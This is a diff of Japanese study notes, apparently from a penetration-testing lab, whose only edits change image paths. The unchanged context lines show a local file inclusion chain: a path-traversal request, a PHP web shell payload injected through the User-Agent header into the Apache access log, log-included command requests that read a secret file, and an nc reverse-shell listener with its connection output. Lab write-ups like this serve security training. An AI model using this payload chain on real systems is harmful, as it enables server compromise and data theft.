@@ -115,7 +115,7 @@ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../.
 ```bash
 User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
 ```
-![](../../assets/images/Pasted%20image%2020260429180653.png)
+![](Pasted%20image%2020260429180653.png)
 
 3. 送信
 - User-Agent内のphpコードがaccess.logに書き込まれる
@@ -132,7 +132,7 @@ GET /meteor/index.php?page=../../../../../xampp/apache/logs/access.log&cmd=dir H
 # cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt
 GET /meteor/index.php?page=../../../../../xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt HTTP/1.1
 ```
-![](../../assets/images/Pasted%20image%2020260429180702.png)
+![](Pasted%20image%2020260429180702.png)
 5. リバースシェル
 ncで待ち受ける
 ```bash
@@ -156,7 +156,7 @@ connect to [192.168.119.3] from (UNKNOWN) [192.168.50.16] 57848
 bash: cannot set terminal process group (24): Inappropriate ioctl for device
 bash: no job control in this shell
 ```
-![](../../assets/images/Pasted%20image%2020260429180713.png)
+![](Pasted%20image%2020260429180713.png)
 ---
 # コマンド内のスペースの対応
 ## 概要
